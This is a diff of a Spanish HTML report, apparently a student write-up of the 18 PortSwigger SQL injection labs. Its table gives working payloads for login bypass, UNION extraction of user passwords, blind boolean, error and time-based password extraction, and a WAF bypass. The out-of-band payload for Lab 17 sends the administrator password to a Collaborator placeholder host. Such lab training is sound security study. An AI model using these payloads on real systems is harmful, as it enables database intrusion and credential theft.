@@ -80,7 +80,7 @@
                 <section>
                     <h2>Introducción</h2>
                     <p>
-                        SQL Injection (SQLi) sigue siendo una de las vulnerabilidades más críticas y comunes en aplicaciones web. Ocurre cuando un sistema permite que datos proporcionados por el usuario manipulen directamente la estructura de consultas SQL enviadas al motor de base de datos. En esta actividad se documenta la resolución práctica de los laboratorios oficiales de SQLi de PortSwigger Web Security Academy utilizando Burp Suite como herramienta de intercepción de tráfico.
+                        SQL Injection (SQLi) sigue siendo una de las vulnerabilidades más críticas y comunes en aplicaciones web. Ocurre cuando un sistema permite que datos proporcionados por el usuario manipulen directamente la estructura de consultas SQL enviadas al motor de base de datos. En esta actividad se documenta la resolución práctica de los 18 laboratorios oficiales de SQLi de PortSwigger Web Security Academy utilizando Burp Suite como herramienta de intercepción de tráfico.
                     </p>
                 </section>
 
@@ -88,72 +88,117 @@
                     <h2>Marco Teórico</h2>
                     <h3>Funcionamiento y Clasificación de Ataques</h3>
                     <p>
-                        El ataque consiste en inyectar metacaracteres de SQL (como comillas simples <code>'</code>, dobles <code>"</code> o comentarios <code>--</code>) en parámetros vulnerables. Esto permite alterar la lógica lógica de la consulta original. Se clasifican principalmente en:
+                        El ataque consiste en inyectar metacaracteres de SQL (como comillas simples <code>'</code>, dobles <code>"</code> o comentarios <code>--</code>) en parámetros vulnerables. Esto permite alterar la lógica de la consulta original. Se clasifican principalmente en:
                     </p>
                     <ul class="tech-list" style="margin-left: 1.5rem;">
                         <li><strong>In-band (Classic):</strong> El atacante utiliza el mismo canal de comunicación tanto para lanzar el ataque como para recibir los datos (ej: UNION-based, Error-based).</li>
                         <li><strong>Blind (Ciega):</strong> La aplicación no muestra datos ni errores en pantalla. Se debe inferir la información mediante respuestas booleanas (Boolean-based) o retardos de tiempo (Time-based).</li>
-                        <li><strong>Out-of-band (OOB):</strong> Se fuerza al servidor de base de datos a iniciar una conexión de red externa (ej: DNS o HTTP) hacia un servidor controlado por el atacante.</li>
+                        <li><strong>Out-of-band (OOB):</strong> Se fuerza al servidor de base de datos a iniciar una conexión de red externa (ej: DNS o HTTP) hacia un servidor de interacción controlado por el atacante (Out-of-band Application Security Testing - OAST).</li>
                     </ul>
                 </section>
 
                 <section>
                     <h2>Desarrollo Práctico (PortSwigger Labs)</h2>
-                    <p>A continuación se resumen los payloads aplicados para resolver los laboratorios:</p>
+                    <p>A continuación se presenta la tabla completa con los 18 laboratorios de PortSwigger Academy resueltos, detallando el título, nivel, tipo de SQLi y el payload exacto de interceptación utilizado:</p>
                     <div class="table-container">
                         <table class="cyber-table">
                             <thead>
                                 <tr>
-                                    <th>Lab ID / Objetivo</th>
-                                    <th>Variante SQLi</th>
-                                    <th>Payload de Interceptación Utilizado</th>
+                                    <th>Lab / Nombre del Laboratorio</th>
+                                    <th>Nivel / Tipo de SQLi</th>
+                                    <th>Payload de Explotación Utilizado</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 <tr>
-                                    <td><strong>Lab 1:</strong> Vulnerabilidad en filtro de categoría</td>
-                                    <td>In-band Classic</td>
+                                    <td><strong>Lab 1:</strong> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</td>
+                                    <td>Apprentice<br>In-band Classic</td>
                                     <td><code>' OR 1=1--</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 2:</strong> Evasión de Login de Admin</td>
-                                    <td>Bypass Autenticación</td>
+                                    <td><strong>Lab 2:</strong> SQL injection vulnerability allowing login bypass</td>
+                                    <td>Apprentice<br>Bypass Autenticación</td>
                                     <td><code>administrator'--</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 3:</strong> Enumeración de columnas (UNION)</td>
-                                    <td>UNION-based</td>
-                                    <td><code>' UNION SELECT NULL,NULL,NULL--</code></td>
+                                    <td><strong>Lab 3:</strong> SQL injection attack, querying the database type and version on Oracle</td>
+                                    <td>Apprentice<br>Union-Based (Oracle)</td>
+                                    <td><code>'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 4:</strong> Búsqueda de columna con texto</td>
-                                    <td>UNION-based</td>
-                                    <td><code>' UNION SELECT 'a',NULL,NULL--</code></td>
+                                    <td><strong>Lab 4:</strong> SQL injection attack, querying the database type and version on MySQL and Microsoft</td>
+                                    <td>Practitioner<br>Union-Based</td>
+                                    <td><code>'+UNION+SELECT+@@version,+NULL%23</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 5:</strong> Recuperar datos de otras tablas</td>
-                                    <td>UNION-based</td>
-                                    <td><code>' UNION SELECT username, password FROM users--</code></td>
+                                    <td><strong>Lab 5:</strong> SQL injection UNION attack, listing the database contents (non-Oracle)</td>
+                                    <td>Apprentice<br>Union-Based (Extracción)</td>
+                                    <td><code>'+UNION+SELECT+username,+password+FROM+users--</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 6:</strong> Concatenación de resultados</td>
-                                    <td>UNION-based</td>
-                                    <td><code>' UNION SELECT NULL, username || '~' || password FROM users--</code></td>
+                                    <td><strong>Lab 6:</strong> SQL injection attack, listing the database contents on Oracle</td>
+                                    <td>Practitioner<br>Union-Based (Oracle)</td>
+                                    <td><code>'+UNION+SELECT+username,+password+FROM+users--</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 11:</strong> Extracción de contraseñas ciegas</td>
-                                    <td>Blind Boolean-based</td>
+                                    <td><strong>Lab 7:</strong> SQL injection UNION attack, determining the number of columns returned by the query</td>
+                                    <td>Practitioner<br>Union-Based (Mapeo)</td>
+                                    <td><code>'+UNION+SELECT+NULL,NULL,NULL--</code> (Probar cantidad hasta no dar error 500)</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 8:</strong> SQL injection UNION attack, finding a column containing text</td>
+                                    <td>Practitioner<br>Union-Based (Tipado)</td>
+                                    <td><code>'+UNION+SELECT+'abc',NULL,NULL--</code> (Probar ubicación de columnas compatibles)</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 9:</strong> SQL injection UNION attack, retrieving data from other tables</td>
+                                    <td>Practitioner<br>Union-Based (Extracción)</td>
+                                    <td><code>'+UNION+SELECT+username,+password+FROM+users--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 10:</strong> SQL injection UNION attack, retrieving multiple values in a single column</td>
+                                    <td>Practitioner<br>Union-Based</td>
+                                    <td><code>category=Pets' union select null, username ||'*'||password from users --</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 11:</strong> Blind SQL injection with conditional responses</td>
+                                    <td>Practitioner<br>Blind Boolean-based</td>
                                     <td><code>TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 12:</strong> Extracción ciega condicional por error</td>
-                                    <td>Blind Error-based</td>
-                                    <td><code>TrackingId=xyz' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--</code></td>
+                                    <td><strong>Lab 12:</strong> Blind SQL injection with conditional errors</td>
+                                    <td>Practitioner<br>Blind Error-based</td>
+                                    <td><code>TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1)||'</code></td>
                                 </tr>
                                 <tr>
-                                    <td><strong>Lab 13:</strong> SQLi ciega con retraso de tiempo</td>
-                                    <td>Blind Time-based</td>
+                                    <td><strong>Lab 13:</strong> Visible error-based SQL injection</td>
+                                    <td>Practitioner<br>Error-Based</td>
+                                    <td><code>TrackingId=xyz' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 14:</strong> Blind SQL injection with time delays</td>
+                                    <td>Practitioner<br>Blind Time-based</td>
                                     <td><code>TrackingId=xyz'||pg_sleep(10)--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 15:</strong> Blind SQL injection with time delays and information retrieval</td>
+                                    <td>Practitioner<br>Blind Time-based</td>
+                                    <td><code>TrackingId=xyz'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 16:</strong> Blind sql injection with out-of-band interaction</td>
+                                    <td>Practitioner<br>Blind Out-of-Band (OAST)</td>
+                                    <td><code>TrackingId=xyz'||(SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/'))--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 17:</strong> Blind sql injection with out-of-band data exfiltration</td>
+                                    <td>Practitioner<br>OOB Exfiltration (OAST)</td>
+                                    <td><code>TrackingId=xyz'||(SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/'))--</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Lab 18:</strong> SQL injection with filter bypass via xml encoding</td>
+                                    <td>Practitioner<br>Bypass con WAF (XML)</td>
+                                    <td><code>&lt;storeId&gt;&amp;#x55;&amp;#x4e;&amp;#x49;&amp;#x4f;&amp;#x4e;&amp;#x20;&amp;#x53;&amp;#x45;&amp;#x4c;&amp;#x45;&amp;#x43;&amp;#x54;&amp;#x20;username || ':' || password FROM users&lt;/storeId&gt;</code> (Uso de Hackvertor Hex entities)</td>
                                 </tr>
                             </tbody>
                         </table>
@@ -165,7 +210,7 @@
                     <ul class="tech-list" style="margin-left: 1.5rem;">
                         <li><strong>Consultas Parametrizadas:</strong> Utilizar Prepared Statements (Sentencias Preparadas) que aseguran que el motor de base de datos trate la entrada del usuario estrictamente como datos, nunca como código ejecutable.</li>
                         <li><strong>Validación de Entradas (Input Validation):</strong> Emplear listas blancas para filtrar caracteres no permitidos antes de procesarlos.</li>
-                        <li><strong>Principio de Mínimo Privilegio:</strong> Configurar el usuario de la base de datos con permisos estrictamente limitados (ej: solo lectura sobre tablas necesarias).</li>
+                        <li><strong>Principio de Mínimo Privilegio:</strong> Configurar el usuario de la base de datos con privilegios estrictamente limitados (ej: solo lectura sobre tablas necesarias).</li>
                     </ul>
                 </section>
 
@@ -173,7 +218,7 @@
                     <h2>Conclusión</h2>
                     <div class="quotation-box">
                         <p>
-                            La resolución de estos laboratorios ilustra cómo técnicas desde una simple inyección basada en unión hasta inyecciones ciegas basadas en error o tiempo pueden llevar al compromiso total de un sistema, incluyendo la fuga de credenciales administrativas. La ciberseguridad defensiva debe enfocarse en la sanitización e inmutabilidad de las consultas como la primera y más efectiva barrera de defensa.
+                            La resolución de estos laboratorios ilustra cómo técnicas desde una simple inyección basada en unión hasta inyecciones ciegas basadas en error o tiempo, así como interacciones fuera de banda (OAST) o técnicas de evasión de WAF (Web Application Firewall) mediante codificación XML, pueden llevar al compromiso total de un sistema. La ciberseguridad defensiva debe enfocarse en la sanitización e inmutabilidad de las consultas como la primera y más efectiva barrera de defensa.
                         </p>
                     </div>
                 </section>
